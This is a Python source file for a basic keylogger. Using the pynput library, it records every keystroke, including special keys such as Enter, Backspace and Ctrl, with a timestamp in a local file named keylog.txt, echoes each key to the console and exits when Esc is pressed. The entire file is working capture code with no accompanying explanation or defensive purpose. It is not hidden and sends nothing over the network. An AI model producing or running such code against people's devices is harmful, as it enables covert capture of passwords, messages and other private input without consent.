from pynput import keyboard
import datetime

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char:
            with open("keylog.txt", "a") as log_file:
                log_file.write(f'{datetime.datetime.now()} - Key pressed: {key.char}\n')
            print(f'Key pressed: {key.char}')  # Debug print statement
        else:
            special_key = str(key)
            if key == keyboard.Key.space:
                special_key = 'SPACE'
            elif key == keyboard.Key.enter:
                special_key = 'ENTER'
            elif key == keyboard.Key.tab:
                special_key = 'TAB'
            elif key == keyboard.Key.backspace:
                special_key = 'BACKSPACE'
            elif key == keyboard.Key.shift:
                special_key = 'SHIFT'
            elif key == keyboard.Key.ctrl:
                special_key = 'CTRL'
            elif key == keyboard.Key.alt:
                special_key = 'ALT'
            elif key == keyboard.Key.esc:
                special_key = 'ESC'
            elif key == keyboard.Key.delete:
                special_key = 'DELETE'
            elif key == keyboard.Key.up:
                special_key = 'UP'
            elif key == keyboard.Key.down:
                special_key = 'DOWN'
            elif key == keyboard.Key.left:
                special_key = 'LEFT'
            elif key == keyboard.Key.right:
                special_key = 'RIGHT'
            else:
                special_key = f'Special key: {key}'

            with open("keylog.txt", "a") as log_file:
                log_file.write(f'{datetime.datetime.now()} - Special key pressed: {special_key}\n')
            print(f'Special key pressed: {special_key}')  # Debug print statement
    except Exception as e:
        print(f"Error logging key press: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()